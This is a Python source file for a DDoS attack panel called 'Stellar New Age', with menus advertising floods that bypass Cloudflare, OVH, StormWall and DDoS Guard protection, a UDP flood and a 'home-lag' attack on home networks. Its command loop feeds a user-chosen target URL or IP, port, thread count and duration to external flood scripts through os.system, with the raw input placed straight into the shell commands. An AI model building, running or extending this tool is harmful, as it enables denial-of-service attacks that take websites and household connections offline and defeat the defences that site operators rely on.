import socket
import time
import os
import datetime
import pytz

dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)


today = dt_mtn.strftime('%B %d, %Y')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def layer7():
    print(f'''\x1b[38;2;254;105;30m╔═════════════════════════\x1b[38;2;255;138;5m═══════════════════════\x1b[38;2;255;162;3m══════════════════════════\x1b[38;2;245;189;37m══════════════════════════════╗
\x1b[38;2;254;105;30m║ \x1b[38;2;255;0;126m[\x1b[38;2;243;243;243mLAYER 7\x1b[38;2;255;0;126m]                                                                                              \x1b[38;2;245;189;37m║         
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mgoat-bypass   \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mBypass BlazingFast, OVH UAM, CF UAM, CF JS, CF CAPTCHA, StormWall, DDoS Guard        \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mcf-bypass     \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mProxied Attack with CF Bypass System                                                 \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mhttp-root     \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mStrong HTTP Attack Without CF Bypass Recommended for unprotected servers             \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m╚══════════════════════════\x1b[38;2;255;138;5m══════════════════════\x1b[38;2;255;162;3m══════════════════════════\x1b[38;2;245;189;37m══════════════════════════════╝''')

def layer4():
    print(f'''\x1b[38;2;254;105;30m╔═════════════════════════\x1b[38;2;255;138;5m═══════════════════════\x1b[38;2;255;162;3m══════════════════════════\x1b[38;2;245;189;37m══════════════════════════════╗
\x1b[38;2;254;105;30m║ \x1b[38;2;255;0;126m[\x1b[38;2;243;243;243mLAYER 4\x1b[38;2;255;0;126m]                                                                                              \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mhome-lag \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mCause lag to home networks                                                                \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mtelnet   \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mPowerful IP Attack                                                                        \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m║ \x1b[38;2;255;35;0m# \x1b[38;2;10;220;0mudp-god  \x1b[38;2;255;35;0m: \x1b[38;2;255;0;126mPowerful UDP Flood Attack                                                                 \x1b[38;2;245;189;37m║
\x1b[38;2;254;105;30m╚══════════════════════════\x1b[38;2;255;138;5m══════════════════════\x1b[38;2;255;162;3m══════════════════════════\x1b[38;2;245;189;37m══════════════════════════════╝
    ''')

def main():
    clear()
    print(f'''
                            \x1b[38;2;254;105;30m╔═╗╔╦╗╔═╗\x1b[38;2;255;138;5m╦  ╦  ╔═╗\x1b[38;2;255;162;3m╦═╗   \x1b[38;2;245;189;37m    ╔╗╔╔═╗╦ ╦ 
                            \x1b[38;2;254;105;30m╚═╗ ║ ║╣ \x1b[38;2;255;138;5m║  ║  ╠═╣\x1b[38;2;255;162;3m╠╦╝  ─\x1b[38;2;245;189;37m──  ║║║║╣ ║║║  
                            \x1b[38;2;254;105;30m╚═╝ ╩ ╚═╝\x1b[38;2;255;138;5m╩═╝╩═╝╩ ╩\x1b[38;2;255;162;3m╩╚═       ╝╚╝╚═╝╚╩╝
                                          \x1b[38;2;255;138;5m╔═╗╔\x1b[38;2;255;162;3m═╗╔═╗
                                          \x1b[38;2;255;138;5m╠═╣║\x1b[38;2;255;162;3m ╦║╣ 
                                          \x1b[38;2;255;138;5m╩ ╩╚\x1b[38;2;255;162;3m═╝╚═╝ 
                                 \x1b[38;2;254;105;30m╔═══\x1b[38;2;255;138;5m═════════\x1b[38;2;255;162;3m══════\x1b[38;2;245;189;37m══════╗
                                 \x1b[38;2;254;105;30m║   \x1b[38;2;255;0;126mSte\x1b[38;2;221;7;127mll\x1b[38;2;187;14;128mar \x1b[38;2;152;21;128m- Ne\x1b[38;2;118;28;129mw Ag\x1b[38;2;84;35;130me    \x1b[38;2;245;189;37m║
                                 \x1b[38;2;254;105;30m║     \x1b[38;2;255;0;126m>\x1b[38;2;221;7;127m C\x1b[38;2;187;14;128mrea\x1b[38;2;152;21;128mted \x1b[38;2;118;28;129mby <     \x1b[38;2;245;189;37m║
                                 \x1b[38;2;254;105;30m║        \x1b[38;2;221;7;127mGho\x1b[38;2;152;21;128mstT\x1b[38;2;152;21;128mD         \x1b[38;2;245;189;37m║
                                 \x1b[38;2;254;105;30m╚═══\x1b[38;2;255;138;5m═════════\x1b[38;2;255;162;3m══════\x1b[38;2;245;189;37m══════╝
                                       \x1b[38;2;255;0;126m{today}

\x1b[38;2;255;138;5m>>> \x1b[38;2;255;0;126mVersion: Stellar New Age v1.3

\x1b[38;2;255;138;5m>>> \x1b[38;2;243;243;243mCredits:
\x1b[38;2;255;138;5m>>> \x1b[38;2;243;243;243mMHProDev, EmpFaked
\x1b[38;2;255;138;5m>>> \x1b[38;2;243;243;243mz3ntl3, RootSec
    ''')
    layer7()
    layer4()
    while True:
        cnc = input(f'''\x1b[38;2;255;133;251m┌──\x1b[38;2;255;17;251m(\x1b[38;2;98;255;110m@\x1b[38;2;255;35;0mroot\x1b[38;2;255;17;251m)\x1b[38;2;51;232;65m-\x1b[38;2;255;17;251m[\x1b[38;2;96;255;108m/\x1b[38;2;197;17;255mr00t\x1b[38;2;96;255;108m/\x1b[38;2;197;17;255mstellar\x1b[38;2;96;255;108m/\x1b[38;2;255;17;251m]
\x1b[38;2;255;133;251m└─\x1b[38;2;96;255;108m> \x1b[38;2;243;243;243m''')

        if 'cf-bypass' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node cf-bypass.js {url} {time}')
            except IndexError:
                print('Usage: cf-bypass <url> <time>')

        elif 'http-root' in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python2 http-root.py {url}')
            except IndexError:
                print('Usage: http-root <url>')

        elif 'goat-bypass' in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                requests = cnc.split()[3]
                os.system(f'node method.js {url} {time} request {requests}')
            except IndexError:
                print('Usage: goat-bypass <url> <time> <rps/threads>')

        elif 'udp-god' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print('Usage: udp-god <ip> <port> <threads> <throttle> <time>')

        elif 'home-lag' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home-lag <ip> <port> <psize/50000> <time>')

        elif 'telnet' in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
            except IndexError:
                print('Usage: telnet <ip> <threads> <pps> <time>')

        elif 'cls' in cnc:
            main()


main()